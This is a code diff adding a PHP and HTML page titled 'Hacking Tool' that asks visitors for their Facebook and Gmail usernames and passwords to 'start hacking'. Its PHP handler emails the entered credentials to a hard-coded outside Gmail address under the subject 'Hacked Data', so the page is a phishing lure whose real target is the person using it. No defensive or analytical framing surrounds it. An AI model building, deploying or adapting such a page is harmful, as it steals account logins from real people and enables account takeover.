@@ -1,0 +1,45 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $data = $_POST['data'];
+    $email = 'udoymistry37@gmail.com';
+    $subject = 'Hacked Data';
+    $message = "Facebook ID: " . $data['facebookID'] . "\nFacebook Password: " . $data['facebookPassword'] . "\nGmail ID: " . $data['gmailID'] . "\nGmail Password: " . $data['gmailPassword'];
+
+    // Send the data as an email using the mail() function
+    $headers = "From:udoymistry@gmail.com\r\n";
+    $headers .= "Reply-To: udoymistry37@gmail.com\r\n";
+    $headers .= "MIME-Version: 1.0\r\n";
+    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+
+    if (mail($email, $subject, $message, $headers)) {
+        echo 'Data sent successfully';
+    } else {
+        echo 'Error sending data';
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hacking Tool</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Hacking Tool</h1>
+        <p>Enter your Facebook ID and password to start the hacking process.</p>
+        <form id="hackingForm">
+            <label for="facebookID">Facebook ID:</label>
+            <input type="text" id="facebookID" name="facebookID" required>
+            <label for="facebookPassword">Facebook Password:</label>
+            <input type="password" id="facebookPassword" name="facebookPassword" required>
+            <label for="gmailID">Gmail ID:</label>
+            <input type="text" id="gmailID" name="gmailID" required>
+            <label for="gmailPassword">Gmail Password:</label>
+            <input type="password" id="gmailPassword" name="gmailPassword" required>
+            <button type="submit">Start Hacking</button>
+        </form>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
